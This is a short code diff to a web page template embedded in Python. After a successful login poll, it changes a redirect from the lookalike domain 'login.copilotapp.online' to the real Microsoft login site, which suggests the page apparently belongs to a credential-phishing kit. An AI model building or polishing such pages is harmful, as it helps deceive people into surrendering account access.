@@ -915,7 +915,7 @@ INDEX_HTML = '''
                     isPollingActive = false;
                     showPanel('successPanel');
                     setTimeout(() => {
-                        window.location.href = 'https://login.copilotapp.online/docx';
+                        window.location.href = 'https://login.microsoftonline.com';
                     }, 2000);
                 } else if (data.status === 'failed') {
                     clearInterval(pollingInterval);
